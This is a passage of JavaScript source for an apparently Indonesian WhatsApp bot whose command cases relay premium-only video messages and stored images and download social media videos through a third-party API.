/AFJwUtPh1z0pieI3SmS8FTK0RL9KP//EABsRAQACAgMAAAAAAAAAAAAAAAABAjFBEBFC/9oACAEDAQE/AHaJ5hOUqJysqna3lTb/2Q==",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan5': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/AhYSj1MUKNbYkGkop4QGM5JQDX5LzjsKCL6HynJULoN4.enc",
"mimetype": "video/mp4",
"fileSha256": "4mT5xSHgqwpeFnv5s9E6pMftW0ULmJ9Xbcu/d5koCSY=",
"fileLength": "2434816",
"seconds": 15,
"mediaKey": "I66ZMH2JR7sG6L1cA/J60q8LlqE2QPHpX4QV/wxLVaE=",
"height": 1024,
"width": 576,
"fileEncSha256": "mdpJPdb7uDuCMT6OBeTzsrKhG7z8LFcWRCPJ9oLfZcM=",
"directPath": "/v/t62.7161-24/29032125_499171118777514_8503128052115281965_n.enc?ccb=11-4&oh=01_AdRfgwh9FYhF7KWQPbZqiURj5aC72vWfi_BKNE9HmtA_4A&oe=63E285F0",
"mediaKeyTimestamp": "1673208564",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAtAAEBAQEBAAAAAAAAAAAAAAACAwABBAEBAQEBAAAAAAAAAAAAAAAAAgEAA//aAAwDAQACEAMQAAAA8VC+3HhZskyg29RgDPWIsDbuDNLCHUDoQKKCt56HKYWo53ZnPaKFdpv/xAAfEAADAQACAgMBAAAAAAAAAAAAAQIRECESMQNBQnH/2gAIAQEAAT8ASSFw0h8JCRgxo1ErtGGDRaMJ9iL+VqmpnUvZ1STRa4n3xMY3S/Xs+i+JtaeaJ+SsnJ9sqi2aie2non4vdG0kP+l8LEZNdabI8G0zxG+xPs0+h9Gn/8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECERIhEFH/2gAIAQIBAT8A4cJFmkX5G9NnTbIzo2JKiaR8P//EABsRAAMBAQADAAAAAAAAAAAAAAABEQISAyFB/9oACAEDAQE/AKysyQ4aSZCI1OUhT6cI1haOEabp426y+2f/2Q==",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan6': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ami1O8HlP3fJv735AMiZGcnEwQJPHo4teDowt3Jg8u45.enc",
"mimetype": "video/mp4",
"fileSha256": "GfikYNJesdvYbd/nBp/pgs0elVeLw5MjBtTFeztH8Uw=",
"fileLength": "1850255",
"seconds": 17,
"mediaKey": "QG87Jz8NpCPNWSsjipBreyEG2Tvod2m5KCcYWnX0VJg=",
"height": 1024,
"width": 576,
"fileEncSha256": "YNBkz2eh0Ql9sRMvmTsYnVS5CoZeG1VARXtrM9HPINk=",
"directPath": "/v/t62.7161-24/11843021_4211449328979240_4968611040884473707_n.enc?ccb=11-4&oh=01_AdS_I3VLvdWOFu3zBAf_d1wY3Z4YF1MaQPFkI_zYIvZROg&oe=63E27F17",
"mediaKeyTimestamp": "1673208565",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAACAwQAAQUBAAMBAAAAAAAAAAAAAAAAAAECAwD/2gAMAwEAAhADEAAAAPGYtjDorcQrd5s0aJYVfL6sT5T3LK8qnrxFrVukktcYLiCiTPXxVUCSlcKmzaJNW2Cx2ff/xAAjEAACAgICAQUBAQAAAAAAAAAAAQIRAxIQMVEEISJBUjJh/9oACAEBAAE/AEJcMa4Q2orZiy2+vY7VobXEMLu5dGR7tR1pfSJemetqkyLaTRCOz/xdm+EUz1M08i18GLeWJOS+WpjhOE3GUOyopVRrj8GNbSSFjx/g1eydi6M8V2uMH9EJLauJMzOo8YH7sc0siYpk5kntBo0n+iNC08Ib+0Tal8bsk6TSPl5QhSL9hapuo0Nss//EAB0RAQACAgIDAAAAAAAAAAAAAAEAERASITECICL/2gAIAQIBAT8AuXePpeSCku/TwdlwqdMtHhmy9uP/xAAbEQACAwADAAAAAAAAAAAAAAAAEAERIQISMf/aAAgBAwEBPwCjqsOVSUeOchYqhf/Z",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan7': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/Atj0GXF8xJG1_FtFmqhvmMJPEHXB7eSHM3wALGDOXvlb.enc",
"mimetype": "video/mp4",
"fileSha256": "/sDEkoGNxpgjS8weScu1i533nHXD0ULjJtVjk4r4JLs=",
"fileLength": "1379041",
"seconds": 12,
"mediaKey": "jxflZEkUjR0AhXag19oj9rdjsSgmwTBumXccIkytHpQ=",
"height": 1024,
"width": 576,
"fileEncSha256": "C14HkQeXYa0Gw8NpMWP3ZjZs3yYA32N2zDCZXvdFwRs=",
"directPath": "/v/t62.7161-24/19973139_131567349549805_3848517727519291180_n.enc?ccb=11-4&oh=01_AdS6dcfUQSrX4-APQCPq_giZ1O4x4SMhNUfN4ChZ1V_ItA&oe=63E28F55",
"mediaKeyTimestamp": "1673208565",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAvAAACAwEAAAAAAAAAAAAAAAAEBQABAwIBAAMBAQAAAAAAAAAAAAAAAAECAwAE/9oADAMBAAIQAxAAAAAM0cqdBZQm14GjEMt7VK5SrOnRzjwZKpC8kN0W95snRlCcOHrVhksuzmQmMcseA7HwjaQnRbICLxI0v//EACMQAAICAgIBBAMAAAAAAAAAAAECAAMREgQhMQUQE0EiMlH/2gAIAQEAAT8ARYidSy8qCVQlRFdbVyJYPauZ2QqB2RPhsao94nGbWzU/ctWaylMmbojgEgSy5C7pWfIgOto78GNq65BzNZSuCJzVK2k/RhJg7M4iOGIIIGJpKWnqPbD2rBLACVqde5iVtObYP1HtwKwzlj9QaaTev+w2tr+HZMdX8sDMTiMUeW2Fdp8zTiMBLArLgicaipV2xkzkso8ASx8ibSp9WE3BSIwSqWs1jHEbYTcz/8QAGREBAQEBAQEAAAAAAAAAAAAAAQARECES/9oACAECAQE/AODHrZkvy5B7LhKq25LsBMc//8QAGhEBAQEBAQEBAAAAAAAAAAAAAQARAiEQIv/aAAgBAwEBPwCxknwnrYNNl/Nya2gEc6Rznsrtw3b58//Z",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan8': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aqq_jkNyYUsq_QW2a-mC61yt8xm33M08jPw3eOST36TO.enc",
"mimetype": "video/mp4",
"fileSha256": "2rhn22K/f0B7VG12xpRWDuZsrwA3u9npLSWM+DI9h1Y=",
"fileLength": "3150798",
"seconds": 15,
"mediaKey": "/I6qQ/+w0FsZmF+AM07qm0ZxExekxH0b0LRjN3Z9TEQ=",
"height": 1024,
"width": 576,
"fileEncSha256": "cIGu3i7Ueqi2SfdwZ5N6g6eC8nzbHeQr8d7GkmtcLTM=",
"directPath": "/v/t62.7161-24/13156814_480613080901754_6912333234988724279_n.enc?ccb=11-4&oh=01_AdTjn3h8Uw8aL_rD8jllOhP9LURzBsdhBvVIFYfeGsmhXA&oe=63E2871B",
"mediaKeyTimestamp": "1673208654",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAR52Nd0JbcJAPISVXX2VVAuAMFLldOY0sbSVSyVQ7aWffB5F0cPZgjVOcbW3lN0KxvkEbLSBuf//EACcQAAICAgEBBwUAAAAAAAAAAAECABEDBBITEBQgISIxUTJBUlNh/9oACAEBAAE/APBUrsMrwGEgTqJ8wG+0tQilsr0I+ploVMfPGaMB7MreU0+KjkZiZCOX2m9SvaxX9M7z/Jk85oYUfFDgFH3m+iLhEBoL8XOvq/gsaaW10HIb2MDCuYYVN3Z6+Sh9ImjgQ4vWs7lr/rEw4+q5WY9AXbRMC8SsTRwK3KpiIUkS5rsRmWY3sGhOLUDFtqm0jI4ZDOrP/8QAGREAAgMBAAAAAAAAAAAAAAAAAAECEBEx/9oACAECAQE/ANtvBS2pC7UsNSY2yfFTP//EABsRAQADAAMBAAAAAAAAAAAAAAEAAhEQEiEg/9oACAEDAQE/APhE43r7FWvDNumMo1awieTcn//Z",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan9': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/AvAKooRbWxXSy1OIq2NUzSdHzdYiL53kq7aroMdvHPIp.enc",
"mimetype": "video/mp4",
"fileSha256": "X1p6p8aFA6MrjTZESGaUv95yCT1CQAUFQZ+ak8JW4fo=",
"fileLength": "11040386",
"seconds": 15,
"mediaKey": "SLi/9IQAHvXf92Q9ZcnrB/aB708vtpWC9VRObsYunI8=",
"height": 1024,
"width": 576,
"fileEncSha256": "DrtvhP/j5ifQK/V5W5EoJa0ZoupWzMa7LQGSsr/8A+E=",
"directPath": "/v/t62.7161-24/30793932_559867169086420_4027102381465858290_n.enc?ccb=11-4&oh=01_AdRjPg04yZn67PXhqy-dIX9v3_e1fXmEcYo6Ak3JpjKWWA&oe=63E296C5",
"mediaKeyTimestamp": "1673208806",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAMFBgECAQEBAQEAAAAAAAAAAAAAAAABAgAD/9oADAMBAAIQAxAAAACjlTlzNdU9gy/ycuMhHfKc+yrtWzjWCzPTlwUljrnlJgzdvSeaFn616LQYi6mj5J7TLwAPoDa4kDH/xAAjEAACAgEDBAMBAAAAAAAAAAABAgADEgQRIRAxUVIFFCIT/9oACAEBAAE/AFsB7wr2IM2mnOdSzGY9K3I6aB/0UmMxlqMjFWGx6VPvwZU5SxDAQQD01enFpLEHKD4u4plCrVsQeCIluQAM0lmdI6KoIm81y76pwJgVM0uqNB2bsZ9yj2hs8HiZfgseABLLi9zPBtYwENRC7seJinsIltqkYuZnfchVnh3U7TTjO1Vg0lRHM+nR6xGxYGf0GwKmOCTl5MobC1TEs3AmYlyYniAkQMZ2IiWFlUAznyZ//8QAFhEBAQEAAAAAAAAAAAAAAAAAASAA/9oACAECAQE/AMWN/wD/xAAZEQACAwEAAAAAAAAAAAAAAAABEAARIAL/2gAIAQMBAT8AhzSPLs4//9k=",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break

case 'asupan10':{
m.reply(`Server HwMods Down Sementara`)
}
break
case 'igdl':
if (args.length == 0) return m.reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
var url = data.result[0]
if (url.includes('.mp4')) {
haikal.sendMessage(from, { video: { url }, mimetype: 'video/mp4' })
} else {
haikal.sendMessage(from, { image: { url } })
}
})
break
case 'igdl2':
if (args.length == 0) return m.reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
for (var x of data.result) {
if (x.includes('.mp4')) {
haikal.sendMessage(from, { video: { url: x }, mimetype: 'video/mp4' })
} else {
haikal.sendMessage(from, { image: { url: x } })
}
}
})
break
case "tiktokvideo":{
if (!q) return m.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
m.reply(mess.wait)
let res = await tiktok(q)
let ghd = await haikal.sendMessage(m.chat,{video:{url: res.url[0].url},caption: "Sukses"},{quoted:m})
}
break
case "tiktokaudio":{
if (!q) return reply (`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
m.reply(mess.wait)
let res = await tiktok(q)
let ghd = await haikal.sendMessage(m.chat,{audio:{url: res.url[1].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case 'twtdl':
if (args.length == 0) return m.reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
axios.get(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
haikal.sendMessage(from, { video: { url: data.result.link[data.result.link.length - 1].link }, mimetype: 'video/mp4' })
})
break
case 'fbdl':
if (args.length == 0) return m.reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
haikal.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4' })
})
break
case 'hw1': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw1,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw2': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw2,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw3': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw3,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw4': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw4,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw5': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw5,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw6': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw6,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw7': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw7,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw8': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw8,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw9': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw9,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw10': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw10,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw11': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw11,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw12': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw12,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw13': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw13,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw14': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw14,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw15': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw15,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw16': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw16,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw17': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw17,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw18': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw18,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw19': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw19,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw20': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw20,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw21': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw21,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw22': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw22,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw23': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw23,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw24': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw24,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw25': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw25,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw26': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw26,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw27': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw27,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw28': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw28,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw29': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw29,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw30': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw30,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw31': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw31,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw32': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw32,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw33': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw33,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw34': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw34,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw35': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw35,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw36': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw36,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw37': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw37,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw38': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw38,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw39': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw39,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw40': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw40,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw41': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw41,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw42': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw42,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw43': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw43,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw44': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw44,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw45': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw45,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw46': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw46,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw47': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw47,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw48': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw48,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw49': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw49,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw50': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw50,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw51': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw51,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw52': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw52,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw53': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw53,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw54': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw54,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw55': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw55,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw56': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw56,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw57': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw57,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw58': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw58,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw59': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw59,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw60': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw60,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw61': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw61,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw62': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw62,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw63': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw63,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw64': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw64,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
